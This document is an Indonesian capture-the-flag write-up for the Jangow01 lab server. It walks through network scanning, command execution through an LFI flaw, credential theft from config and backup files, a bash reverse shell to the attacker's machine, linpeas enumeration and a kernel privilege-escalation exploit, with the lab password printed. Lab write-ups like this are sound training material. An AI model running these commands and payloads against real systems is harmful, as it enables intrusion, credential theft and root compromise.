# Laporan Serangan Server Jangow01-1.0.1

Ini adalah hasil serangan yang telah dilakukan pada server Jangow01 untuk latihan serangan.

## Pencarian IP Address Server

- cek ip pc : `ip a` atau `ifconfig` 
- nmap: `nmap -sP <network_id>/<prefix>`
- uji koneksi, kali linux dan server jangow01: `ping <ip_server>`

## Scan Port Server dengan NMAP
- nmap : `nmap -sC -sV <ip_server>`

**Port** yang terbuka dari server adalah :
- ftp (21)
- http (80)

## Access HTTP Server
- coba website dan temukan menu buscar
- terdapat Local File Inclusion (LFI) vulnerability
- ketikkan perintah linux pada URL yang rentan LFI
	- `ls -al`
	- `ls -al wordpress`
- buka file config
	- `cat wordpress/config.php`
- access ftp dengan informasi config.php
	- `ftp <ip_server>`
	- user : <pada_file_config.php>, password : <pada_file_config.php>
	- ftp: Login failed
- cari file lain pada URL LFI
	- `pwd`
	- `ls -al /var/www/html`
- buka file .backup
	- `cat /var/www/html/.backup`
- access ftp dengan informasi .backup
	- `ftp <ip_server>`
	- user : <pada_file.backup>, password : <pada_file.backup>
	- 230 Login successful


## Gunakan Netcat Pada Server
untuk remote server. Karena web terdapat rentan **LFI** dan tidak tersedia port **SSH** maka dari itu kita dapat menggunakan netcat untuk remote server
- buka terminal baru
- buat koneksi netcat server
	- `nc <ip_server> 21`
- login
	- `USER jangow01`
	- `PASS abygurl69`
- buka terminal baru lagi, tanpa menutup terminal sebelumnya
- buat listener netcat
	- `sudo nc -lvnp 443`
- pada url lfi jalankan payload
	- `/bin/bash -c 'bash -i >& /dev/tcp/<ip_kali_linux>/443 0>&1'`
	- encoder payload terlebih dahulu : https://www.urlencoder.org/
- remote berhasil dilakukan
- gunakan reverse dengan python
- ketik perintah di remote tadi
	- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
	- `export TERM=xterm`
- pindah dari mode non user menjadi user jangow
	- `su jangow01`
	- password : `abygurl69`
	- masuk home : `cd /home/jangow01`


## Privilege Escalation
karena user jangow tidak bisa akses user root, maka kita perlu mencari rentan untuk akses root menggunakan tool LINPEASS
- download LINPEASS
	- `https://github.com/carlospolop/PEASS-ng/releases/download/20220731/linpeas.sh`
	- atau menggunakan terminal 
	```
	wget https://github.com/carlospolop/PEASS-ng/releases/download/20220731/linpeas.sh
	```
- upload pada folder home/jangow01 dengan ftp
	- login ftp
	- masuk folder : `cd /home/jangow01`
	- upload file : `put linpeas.sh` (sesuaikan direktori dari linpeas.sh)
- pindah ke terminal netcat remote
	- ubah mode linpeas : `chmod +x linpeas.sh`
	- jalankan linpeas : `./linpeas.sh`
	- dan tunggu (agak sedikit lama)
	- cari CVE (scroll keatas)
	- CVE get_rekt : CVE-2017-16695, Source: http://www.exploit-db.com/exploits/45010


## Exploit
- download exploit
	- `https://www.exploit-db.com/download/45010`
- upload exploit dengan ftp
	- login ftp
	- masuk folder : `cd /home/jangow01`
	- upload file : `put 45010.c` (sesuaikan direktori letak file)
- compile `gcc 45010.c -o cve-2017-16995`
- run `./cve-2017-16995`
- temukan flag
	- masuk root `cd /root`
	- lihat isi folder `ls -al`
	- flag `cat proof.txt`